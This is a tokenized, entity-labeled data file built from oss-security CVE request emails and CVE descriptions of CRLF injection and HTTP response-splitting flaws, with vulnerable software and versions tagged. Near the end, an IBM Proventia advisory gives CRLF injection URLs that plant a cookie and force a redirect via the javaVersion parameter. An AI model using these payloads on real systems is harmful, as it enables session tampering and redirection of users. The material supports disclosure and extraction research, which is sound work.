5dkdypWOqun1BRLr72vyGxvO7KPoSijAvm8K2q7N3sPhB0D1bj914xhw1XCHorj5 O O
zJ7/6krCefJY2bCGt90zqzjN/pAVXYYoi5i0czZAaiVDjcj87udgXVgzk3MjX7zh O O
+UFxL5tJaWE9jZsXD61JkFhq/ZvKhfSjGbj1gmcNQxf7FFWoXoKLttHrb3gXHQxX O O
BHEnUgs2zUzrm66Z4hLvztUMw5iJWawJh5s0UtIQaWagrSUY9QeTzeiDej5ppRfC O O
h+41F8n0R1C94e598vCoOEQUXHBDrvJBRSws/ihJyojtOMjQ839X2zKDtcdM/+Nn O O
9q/eL/qrGpCpPfZsKLrT/66glDcbW0ENUaB6EYvn5d3Wx38MkX+KTccqz9v9OKV5 O O
arbFvYr+32AE7AHyxG8UKzSlN/3yz8QlO+6E3ajvAAbndlF+2LbOPtN8X2k0/pUI O O
iPWI3yrtF84GMb9MUmfC3SEnHKZe/K3n3WPCFkyj2VpPv7IFwafCloc6ccUXRfpC O O
MaLplHIotptFWgIYtHwqO3IqcM2Vp0XqsUv02Sfa9ghbt4rJVgEelNcXf7F5mU0W O O
P75K9LZVPjfFbQSKMakn O O
=7TSV O O
END O O
PGP O O
SIGNATURE O O

( O O
should O O
be O O
CVE-2012- O O
one O O
) O O
Thank O O
you O O
& O O
& O O
Regards O O
, O O
Jan. O O
Jan O O
iankko O O
Lieskovsky O O
Red O O
Hat O O
Security O O
Response O O
Team O O
Please O O
use O O
CVE-2012-2374 O O
for O O
this O O
issue O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
Request O O
Tornado O O
( O O
python-tornado O O
) O O
: O O
Tornado O O
v2.2.1 O O
tornado.web.RequestHandler.set_header O O
( O O
) O O
fix O O
to O O
prevent O O
header O O
injection O O

Subject O O
: O O
CVE O O
Request O O
Tornado O O
( O O
python-tornado O O
) O O
: O O
Tornado O O
v2.2.1 O O
tornado.web.RequestHandler.set_header O O
( O O
) O O
fix O O
to O O
prevent O O
header O O
injection O O
Hello O O
Kurt O O
, O O
Steve O O
, O O
vendors O O
, O O
Package O O
: O O
Tornado O O
is O O
an O O
open O O
source O O
version O O
of O O
the O O
scalable O O
, O O
non-blocking O O
web O O
server O O
and O O
tools O O
that O O
power O O
FriendFeed O O
: O O
URL O O
: O O
Issue O O
: O O
A O O
possibility O O
of O O
header O O
injection O O
response O O
splitting O O
flaw O O
was O O
found O O
in O O
the O O
way O O
web O O
request O O
handler O O
of O O
Tornado O O
, O O
a O O
scalable O O
, O O
non-blocking O O
web O O
server O O
and O O
tools O O
, O O
performed O O
sanitization O O
of O O
input O O
arguments O O
, O O
provided O O
to O O
routine O O
setting O O
the O O
HTTP O O
response O O
header O O
name O O
and O O
value O O
. O O

( O O
should O O
be O O
CVE-2012- O O
one O O
) O O
Thank O O
you O O
& O O
& O O
Regards O O
, O O
Jan. O O
Jan O O
iankko O O
Lieskovsky O O
Red O O
Hat O O
Security O O
Response O O
Team O O

Date O O
: O O
Fri O O
, O O
18 O O
May O O
2012 O O
12:40:17 O O
+0200 O O
From O O
: O O
Jan O O
Lieskovsky O O
< O O
jlieskov O O
@ O O
... O O
hat.com O O
To O O
: O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O
CC O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O

Subject O O
: O O
CVE O O
Request O O
Tornado O O
( O O
python-tornado O O
) O O
: O O
Tornado O O
v2.2.1 O O
tornado.web.RequestHandler.set_header O O
( O O
) O O
fix O O
to O O
prevent O O
header O O
injection O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
HMI O O
web O O
server O O
in O O
Siemens S-vulnerable_software pair_0
WinCC S-vulnerable_software pair_0
flexible S-vulnerable_software pair_0
2004 S-vulnerable_version pair_0
, O O
2005 S-vulnerable_version pair_0
, O O
2007 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
SP3 S-vulnerable_version pair_0
; O O
WinCC S-vulnerable_software pair_1
V11 S-vulnerable_software pair_1
( O O
aka S-vulnerable_software pair_1
TIA S-vulnerable_software pair_1
portal S-vulnerable_software pair_1
) O O
before S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
Update S-vulnerable_version pair_1
1 S-vulnerable_version pair_1
; O O
the O O
TP O O
, O O
OP O O
, O O
MP O O
, O O
Comfort O O
Panels O O
, O O
and O O
Mobile O O
Panels O O
SIMATIC O O
HMI O O
panels O O
; O O
WinCC O O
V11 O O
Runtime O O
Advanced O O
; O O
and O O
WinCC O O
flexible O O
Runtime O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
autologin.jsp O O
in O O
Cisco S-vulnerable_software pair_0
CiscoWorks S-vulnerable_software pair_0
Common S-vulnerable_software pair_0
Services S-vulnerable_software pair_0
4.0 S-vulnerable_version pair_0
, O O
as O O
used O O
in O O
Cisco O O
Prime O O
LAN O O
Management O O
Solution O O
and O O
other O O
products O O
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
URL O O
parameter O O
, O O
aka O O
Bug O O
ID O O
CSCtu18693 O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
calendar/set.php O O
in O O
the O O
Calendar O O
in O O
Moodle S-vulnerable_software pair_0
1.9.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
1.9.15 S-vulnerable_version pair_0
, O O
2.0.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
2.0.6 S-vulnerable_version pair_0
, O O
2.1.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
2.1.3 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
2.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
vectors O O
involving O O
the O O
url O O
variable O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
actionpack/lib/action_controller/response.rb O O
in O O
Ruby S-vulnerable_software pair_0
on S-vulnerable_software pair_0
Rails S-vulnerable_software pair_0
2.3.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
2.3.13 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
Content-Type O O
header O O
. O O

Upstream O O
had O O
requested O O
CVEs O O
prior O O
to O O
disclosure O O
, O O
but O O
didn O O
t O O
receive O O
any O O
. O O

Date O O
: O O
Wed O O
, O O
17 O O
Aug O O
2011 O O
10:52:47 O O
-0600 O O
From O O
: O O
Vincent O O
Danen O O
< O O
vdanen O O
@ O O
... O O
hat.com O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
To O O
: O O
Michael O O
Koziarski O O
< O O
michael O O
@ O O
... O O
iarski.com O O
> O O
, O O
aaron O O
@ O O
... O O
derlovemaking.com O O
, O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O

1 O O
) O O
Filter O O
Skipping O O
bugs O O
2 O O
) O O
SQL O O
Injection O O
issues O O
3 O O
) O O
Parse O O
error O O
in O O
strip_tags O O
4 O O
) O O
UTF-8 O O
escaping O O
vulnerability O O
Thanks O O
! O O

Vincent O O
Danen O O
Red O O
Hat O O
Security O O
Response O O
Team O O

Subject O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O
Could O O
we O O
get O O
CVEs O O
assigned O O
to O O
these O O
flaws O O

Subject O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O

Subject O O
: O O
Re O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O
Original O O
Message O O
Could O O
we O O
get O O
CVEs O O
assigned O O
to O O
these O O
flaws O O

1 O O
) O O
Filter O O
Skipping O O
bugs O O
Use O O
CVE-2011-2929 O O
2 O O
) O O
SQL O O
Injection O O
issues O O
Use O O
CVE-2011-2930 O O
3 O O
) O O
Parse O O
error O O
in O O
strip_tags O O
Use O O
CVE-2011-2931 O O
4 O O
) O O
UTF-8 O O
escaping O O
vulnerability O O
Use O O
CVE-2011-2932 O O
Thanks O O
. O O

Date O O
: O O
Fri O O
, O O
19 O O
Aug O O
2011 O O
15:03:52 O O
-0400 O O
( O O
EDT O O
) O O
From O O
: O O
Josh O O
Bressers O O
< O O
bressers O O
@ O O
... O O
hat.com O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
Michael O O
Koziarski O O
< O O
michael O O
@ O O
... O O
iarski.com O O
> O O
, O O
aaron O O
@ O O
... O O
derlovemaking.com O O
, O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O

Subject O O
: O O
Re O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O

Original O O
Message O O
Original O O
Message O O
Could O O
we O O
get O O
CVEs O O
assigned O O
to O O
these O O
flaws O O

Date O O
: O O
Sat O O
, O O
20 O O
Aug O O
2011 O O
00:29:55 O O
-0400 O O
( O O
EDT O O
) O O
From O O
: O O
Vincent O O
Danen O O
< O O
vdanen O O
@ O O
... O O
hat.com O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
Michael O O
Koziarski O O
< O O
michael O O
@ O O
... O O
iarski.com O O
> O O
, O O
aaron O O
@ O O
... O O
derlovemaking.com O O
, O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O

Sorry O O
I O O
missed O O
this O O
one O O
earlier O O
, O O
I O O
was O O
looking O O
at O O
the O O
3.x O O
advisory O O
page O O
and O O
missed O O
this O O
one O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O
Sorry O O
, O O
there O O
is O O
one O O
more O O
flaw O O
that O O
needs O O
a O O
CVE O O
assignment O O
: O O
Response O O
splitting O O
flaw O O
in O O
2.3.x S-vulnerable_version O
( O O
3.0.0 O O
and O O
later O O
not O O
affected O O
) O O
. O O

1 O O
) O O
Filter O O
Skipping O O
bugs O O
Use O O
CVE-2011-2929 O O
2 O O
) O O
SQL O O
Injection O O
issues O O
Use O O
CVE-2011-2930 O O
3 O O
) O O
Parse O O
error O O
in O O
strip_tags O O
Use O O
CVE-2011-2931 O O
4 O O
) O O
UTF-8 O O
escaping O O
vulnerability O O
Use O O
CVE-2011-2932 O O
Vincent O O
Danen O O
Red O O
Hat O O
Security O O
Response O O
Team O O

Subject O O
: O O
Re O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O
Original O O
Message O O

Use O O
CVE-2011-3187 O O
Thanks O O
. O O

Date O O
: O O
Mon O O
, O O
22 O O
Aug O O
2011 O O
16:31:25 O O
-0400 O O
( O O
EDT O O
) O O
From O O
: O O
Josh O O
Bressers O O
< O O
bressers O O
@ O O
... O O
hat.com O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
coley O O
< O O
coley O O
@ O O
... O O
re.org O O

Hi O O
, O O
maybe O O
this O O
issue O O
would O O
qualify O O
for O O
a O O
CVE O O
too O O
( O O

) O O
: O O
This O O
looks O O
like O O
it O O
should O O
also O O
get O O
one O O
. O O

Date O O
: O O
Mon O O
, O O
22 O O
Aug O O
2011 O O
16:26:26 O O
-0400 O O
( O O
EDT O O
) O O
From O O
: O O
Josh O O
Bressers O O
< O O
bressers O O
@ O O
... O O
hat.com O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
Michael O O
Koziarski O O
< O O
michael O O
@ O O
... O O
iarski.com O O
> O O
, O O
aaron O O
@ O O
... O O
derlovemaking.com O O
, O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O

Subject O O
: O O
Re O O
: O O
CVE O O
request O O
: O O
ruby O O
on O O
rails O O
flaws O O
( O O
4 O O
) O O
Original O O
Message O O
Sorry O O
, O O
there O O
is O O
one O O
more O O
flaw O O
that O O
needs O O
a O O
CVE O O
assignment O O
: O O
Response O O
splitting O O
flaw O O
in O O
2.3.x S-vulnerable_version O
( O O
3.0.0 O O
and O O
later O O
not O O
affected O O
) O O
. O O

Use O O
CVE-2011-3186 O O
Thanks O O
. O O

On O O
Friday O O
19 O O
August O O
2011 O O
21:03:52 O O
Josh O O
Bressers O O
wrote O O
: O O
Original O O
Message O O
Could O O
we O O
get O O
CVEs O O
assigned O O
to O O
these O O
flaws O O

Upstream O O
had O O
requested O O
CVEs O O
prior O O
to O O
disclosure O O
, O O
but O O
didn O O
t O O
receive O O
any O O
. O O

5 O O
, O O
D-90409 O O
Nuernberg O O
, O O
Germany O O
Tel O O
: O O
+49-911-74053-0 O O
; O O
SUSE O O
LINUX O O
Products O O
GmbH O O
, O O
GF O O
: O O
Jeff O O
Hawn O O
, O O
HRB O O
16746 O O
( O O
AG O O
Nuernberg O O
) O O

) O O
: O O
Thanks O O
in O O
advance O O
. O O

Matthias O O
Weckbecker O O
, O O
Junior O O
Software O O
Engineer O O
, O O
SUSE O O
Security O O
Team O O
SUSE O O
LINUX O O
Products O O
GmbH O O
, O O
Maxfeldstr O O
. O O

Date O O
: O O
Mon O O
, O O
22 O O
Aug O O
2011 O O
10:24:32 O O
+0200 O O
From O O
: O O
Matthias O O
Weckbecker O O
< O O
mweckbecker O O
@ O O
... O O
e.de O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O

1 O O
) O O
Filter O O
Skipping O O
bugs O O
> O O
3420ac71aed312d6 O O
> O O
a9552 O O
Use O O
CVE-2011-2929 O O
2 O O
) O O
SQL O O
Injection O O
issues O O
> O O
6a1e473744bc389b O O
> O O
4bf85 O O
Use O O
CVE-2011-2930 O O
3 O O
) O O
Parse O O
error O O
in O O
strip_tags O O
> O O
2b9130749b74ea12 O O
> O O
8037a O O
Use O O
CVE-2011-2931 O O
4 O O
) O O
UTF-8 O O
escaping O O
vulnerability O O
> O O
56bffb5923ab1195 O O
> O O
306bd O O
Use O O
CVE-2011-2932 O O
Thanks O O
. O O

Mozilla S-vulnerable_software pair_0
Firefox S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.6.23 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.x S-vulnerable_version pair_0
through S-vulnerable_version pair_0
6 S-vulnerable_version pair_0
, O O
Thunderbird S-vulnerable_software pair_1
before S-vulnerable_version pair_1
7.0 S-vulnerable_version pair_1
, O O
and O O
SeaMonkey S-vulnerable_software pair_2
before S-vulnerable_version pair_2
2.4 S-vulnerable_version pair_2
do O O
not O O
properly O O
handle O O
HTTP O O
responses O O
that O O
contain O O
multiple O O
Location O O
, O O
Content-Length O O
, O O
or O O
Content-Disposition O O
headers O O
, O O
which O O
makes O O
it O O
easier O O
for O O
remote O O
attackers O O
to O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
crafted O O
header O O
values O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Microsoft S-vulnerable_software pair_0
Forefront S-vulnerable_software pair_0
Unified S-vulnerable_software pair_0
Access S-vulnerable_software pair_0
Gateway S-vulnerable_software pair_0
( O O
UAG S-vulnerable_software pair_0
) O O
2010 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
Update S-vulnerable_version pair_0
1 S-vulnerable_version pair_0
, O O
Update S-vulnerable_version pair_0
2 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
, O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
and O O
cross-site O O
scripting O O
( O O
XSS O O
) O O
attacks O O
, O O
via O O
unspecified O O
vectors O O
, O O
aka O O
ExcelTable O O
Response O O
Splitting O O
XSS O O
Vulnerability O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
chart.cgi O O
in O O
Bugzilla S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.2.10 S-vulnerable_version pair_0
, O O
3.4.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
3.4.10 S-vulnerable_version pair_0
, O O
3.6.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
3.6.4 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
4.0.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.0rc2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
query O O
string O O
, O O
a O O
different O O
vulnerability O O
than O O
CVE-2010-2761 O O
and O O
CVE-2010-4411 O O
. O O

Unspecified O O
vulnerability O O
in O O
CGI.pm S-vulnerable_software pair_0
3.50 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unknown O O
vectors O O
. O O

NOTE O O
: O O
this O O
issue O O
exists O O
because O O
of O O
an O O
incomplete O O
fix O O
for O O
CVE-2010-2761 O O
. O O

Steve O O
, O O
could O O
you O O
please O O
allocate O O
CVE O O
id O O
for O O
this O O

Once O O
CGI.pm O O
has O O
a O O
final O O
update O O
to O O
address O O
the O O
remaining O O
header O O
injection O O
issue O O
, O O
I O O
ll O O
share O O
the O O
same O O
patch O O
with O O
CGI O O
: O O
:Simple O O
. O O

A O O
new O O
patch O O
has O O
been O O
developed O O
, O O
and O O
is O O
currently O O
pending O O
review O O
and O O
acceptance O O
by O O
the O O
primary O O
CGI.pm O O
author O O
, O O
Lincoln O O
Stein O O
. O O

Steve O O
, O O
could O O
you O O
please O O
allocate O O
one O O

( O O
id O O
1 O O
) O O
CGI.pm O O
is O O
used O O
by O O
the O O
Bugzilla O O
code O O
base O O
. O O

However O O
, O O
Bugzilla O O
may O O
not O O
always O O
be O O
vulnerable O O
to O O
issues O O
in O O
CGI.pm O O
depending O O
on O O
they O O
use O O
it O O
. O O

( O O
Now O O
CC O O
ed O O
) O O
. O O

Further O O
improvements O O
to O O
handling O O
of O O
newlines O O
embedded O O
in O O
header O O
values O O
. O O

Is O O
it O O
related O O
to O O
CVE-2010-3172 O O

However O O
, O O
later O O
testing O O
found O O
that O O
the O O
issue O O
wasn O O
t O O
completely O O
fixed O O
in O O
3.50 S-vulnerable_version O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
Request O O
perl-CGI O O
two O O
ids O O
, O O
perl-CGI-Simple O O
one O O
id O O
( O O
CVE-2010-3172 O O
already O O
assigned O O
for O O
Bugzilla O O
part O O
) O O
Since O O
perl-CGi O O
is O O
different O O
code O O
base O O
than O O
Bugzilla O O
, O O
we O O
suspect O O
a O O
new O O
CVE O O
id O O
is O O
required O O
for O O
this O O
issue O O

Thanks O O
to O O
Michal O O
Zalewski O O
, O O
Max O O
Kanat-Alexander O O
, O O
Yanick O O
Champoux O O
Lincoln O O
Stein O O
, O O
Frederic O O
Buclin O O
and O O
Mark O O
Stosberg O O
Chris O O
, O O
Mark O O
, O O
could O O
you O O
please O O
provide O O
more O O
details O O
about O O
the O O
issue O O

Yes O O
, O O
it O O
is O O
. O O

An O O
exception O O
is O O
thrown O O
if O O
header O O
values O O
contain O O
invalid O O
newlines O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
Request O O
perl-CGI O O
two O O
ids O O
, O O
perl-CGI-Simple O O
one O O
id O O
( O O
CVE-2010-3172 O O
already O O
assigned O O
for O O
Bugzilla O O
part O O
) O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
header O O
function O O
in O O
( O O
1 O O
) O O
CGI.pm S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.50 S-vulnerable_version pair_0
and O O
( O O
2 O O
) O O
Simple.pm O O
in O O
CGI S-vulnerable_software pair_1
: O O
:Simple S-vulnerable_software pair_1
1.112 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
earlier S-vulnerable_version pair_1
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
vectors O O
related O O
to O O
non-whitespace O O
characters O O
preceded O O
by O O
newline O O
characters O O
, O O
a O O
different O O
vulnerability O O
than O O
CVE-2010-2761 O O
and O O
CVE-2010-3172 O O
. O O

Attackers O O
can O O
inject O O
boundary O O
of O O
multipart/x-mixed-replace O O
. O O

Hi O O
Steve O O
, O O
vendors O O
, O O
Masahiro O O
Yamada O O
reported O O
: O O
the O O
following O O
deficiency O O
( O O
from O O
) O O
: O O
Search O O
result O O
of O O
b.m.o O O
. O O

( O O
id O O
2 O O
) O O
Yet O O
, O O
back O O
to O O
CVE-2010-3172 O O
, O O
Masahiro O O
mentions O O
in O O
, O O
that O O
perl-CGI-Simple O O
is O O
prone O O
to O O
same O O
deficiency O O
, O O
as O O
CVE-2010-3172 O O
in O O
Bugzilla O O
was O O
: O O
Looks O O
, O O
like O O
it O O
was O O
already O O
fixed O O
in O O
perl-CGI-Simple O O
too O O
: O O
Relevant O O
perl-CGi-Simple O O
patch O O
: O O
Steve O O
, O O
could O O
you O O
allocate O O
new O O
CVE O O
id O O
for O O
this O O
issue O O

It O O
may O O
be O O
able O O
to O O
be O O
used O O
for O O
HTTP O O
Header O O
injection O O
. O O

The O O
MIME O O
boundary O O
in O O
multipart_init O O
is O O
now O O
random O O
Thanks O O
to O O
Byron O O
Jones O O
, O O
Masahiro O O
Yamada O O
, O O
Reed O O
Loden O O
, O O
and O O
Mark O O
Stosberg O O
Since O O
perl-CGi O O
is O O
different O O
code O O
base O O
than O O
Bugzilla O O
, O O
we O O
suspect O O
a O O
new O O
CVE O O
id O O
is O O
required O O
for O O
this O O
issue O O

Date O O
: O O
Wed O O
, O O
01 O O
Dec O O
2010 O O
18:28:55 O O
+0100 O O
From O O
: O O
Jan O O
Lieskovsky O O
< O O
jlieskov O O
@ O O
... O O
hat.com O O
To O O
: O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O
CC O O
: O O
oss-security O O
< O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
> O O
, O O
Marcela O O
Maslanova O O
< O O
mmaslano O O
@ O O
... O O
hat.com O O
> O O
, O O
Petr O O
Pisar O O
< O O
ppisar O O
@ O O
... O O
hat.com O O
> O O
, O O
Chris O O
BinGOs O O
Williams O O
< O O
chris O O
@ O O
... O O
gosnet.co.uk O O
> O O
, O O
Reed O O
Loden O O
< O O
reed O O
@ O O
... O O
dloden.com O O
> O O
, O O
Masahiro O O
Yamada O O
< O O
masa141421356 O O
@ O O
... O O
il.com O O
> O O
, O O
Byron O O
Jones O O
< O O
glob O O
@ O O
... O O
b.com.au O O
> O O
, O O
Mark O O
Stosberg O O
< O O
mark O O
@ O O
... O O
mersault.com O O

does O O
not O O
escape O O
=_aaaaaaaaaa0 O O
: O O
it O O
is O O
used O O
as O O
boudary O O
of O O
multipart/x-mixed-replace O O
. O O

Subject O O
: O O
CVE O O
Request O O
perl-CGI O O
two O O
ids O O
, O O
perl-CGI-Simple O O
one O O
id O O
( O O
CVE-2010-3172 O O
already O O
assigned O O
for O O
Bugzilla O O
part O O
) O O

( O O
id O O
3 O O
) O O
Thanks O O
& O O
& O O
Regards O O
, O O
Jan. O O
Jan O O
iankko O O
Lieskovsky O O
Red O O
Hat O O
Security O O
Response O O
Team O O

( O O
id O O
2 O O
) O O
Mozilla O O
already O O
allocated O O
CVE-2010-2761 O O
to O O
this O O
part O O
for O O
the O O
perl-CGI O O
issue O O
. O O

~reed O O
Mozilla O O
Security O O
Group O O
Reed O O
Loden O O
reed O O
@ O O
... O O
dloden.com O O

Date O O
: O O
Wed O O
, O O
1 O O
Dec O O
2010 O O
10:55:33 O O
-0800 O O
From O O
: O O
Reed O O
Loden O O
< O O
reed O O
@ O O
... O O
dloden.com O O
To O O
: O O
Mark O O
Stosberg O O
< O O
mark O O
@ O O
... O O
mersault.com O O
Cc O O
: O O
oss-security O O
< O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
> O O
, O O
Jan O O
Lieskovsky O O
< O O
jlieskov O O
@ O O
... O O
hat.com O O
> O O
, O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O
> O O
, O O
Marcela O O
Maslanova O O
< O O
mmaslano O O
@ O O
... O O
hat.com O O
> O O
, O O
Petr O O
Pisar O O
< O O
ppisar O O
@ O O
... O O
hat.com O O
> O O
, O O
Chris O O
BinGOs O O
Williams O O
< O O
chris O O
@ O O
... O O
gosnet.co.uk O O
> O O
, O O
Masahiro O O
Yamada O O
< O O
masa141421356 O O
@ O O
... O O
il.com O O
> O O
, O O
Byron O O
Jones O O
< O O
glob O O
@ O O
... O O
b.com.au O O
> O O
, O O
Lincoln O O
Stein O O
< O O
lincoln.stein O O
@ O O
... O O
il.com O O

CRLF O O
injection O O
vulnerability O O
in O O
Bugzilla S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.2.9 S-vulnerable_version pair_0
, O O
3.4.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
3.4.9 S-vulnerable_version pair_0
, O O
3.6.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
3.6.3 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
4.0.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.0rc1 S-vulnerable_version pair_0
, O O
when O O
Server O O
Push O O
is O O
enabled O O
in O O
a O O
web O O
browser O O
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
content O O
, O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
, O O
via O O
a O O
crafted O O
URL O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
HP S-vulnerable_software pair_0
System S-vulnerable_software pair_0
Management S-vulnerable_software pair_0
Homepage S-vulnerable_software pair_0
( O O
SMH S-vulnerable_software pair_0
) O O
before S-vulnerable_version pair_0
6.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
load.php O O
in O O
the O O
Local O O
Management O O
Interface O O
( O O
LMI O O
) O O
on O O
the O O
IBM S-vulnerable_software pair_0
Proventia S-vulnerable_software pair_0
Network S-vulnerable_software pair_0
Mail S-vulnerable_software pair_0
Security S-vulnerable_software pair_0
System S-vulnerable_software pair_0
( O O
PNMSS S-vulnerable_software pair_0
) O O
appliance O O
with O O
firmware O O
before S-vulnerable_version pair_0
2.5 S-vulnerable_version pair_0
allows O O
remote O O
authenticated O O
users O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
javaVersion O O
parameter O O
. O O

Credits O O
Dr. O O
Marian O O
Ventuneac O O

The O O
following O O
exploit O O
allows O O
injecting O O
custom O O
cookies O O
used O O
by O O
the O O
client O O
browser O O
during O O
a O O
valid O O
HTTP O O
session O O
: O O
url_placeholder/load.php O O
browVerOK=true O O
& O O
browVerPerfect=false O O
& O O
javaVersion O O
=any O O
% O O
0D O O
% O O
0ASet-cookie O O
: O O
% O O
20MyOwnCookie=SOME_DATA_HERE O O
& O O
javaVendor=Sun O O
% O O
20Microsystems O O
% O O
20Inc. O O
& O O
javaEnabled=true O O
& O O
welcome=true O O
& O O
detectionFlag=1 O O
& O O
popupBlocked=no O O
The O O
following O O
exploit O O
allows O O
forcing O O
external O O
browser O O
redirects O O
: O O
url_placeholder/load.php O O
browVerOK=true O O
& O O
browVerPerfect=false O O
& O O
javaVersion O O
=any O O
% O O
0D O O
% O O
0ALocation O O
: O O
% O O
20 O O

Alternatively O O
, O O
please O O
contact O O
IBM O O
for O O
technical O O
support O O
. O O

Affected O O
Versions O O
IBM S-vulnerable_software pair_0
Proventia S-vulnerable_software pair_0
Network S-vulnerable_software pair_0
Mail S-vulnerable_software pair_0
Security S-vulnerable_software pair_0
System S-vulnerable_software pair_0
- O O
virtual S-vulnerable_software pair_0
( O O
firmware O O
1.6 S-vulnerable_version pair_0
) O O
Mitigation O O

Vendor O O
: O O
IBM O O
Products O O
: O O
Proventia O O
Network O O
Mail O O
Security O O
System O O
Vulnerabilities O O
: O O
CRLF O O
Injection O O
Risk O O
: O O
Medium O O
Attack O O
Vector O O
: O O
From O O
Remote O O
Authentication O O
: O O
Required O O
Reference O O
: O O
Description O O
Web-based O O
Local O O
Management O O
Interface O O
( O O
LMI O O
) O O
of O O
IBM S-vulnerable_software pair_0
Proventia S-vulnerable_software pair_0
Network S-vulnerable_software pair_0
Mail S-vulnerable_software pair_0
Security S-vulnerable_software pair_0
System S-vulnerable_software pair_0
( O O
firmware O O
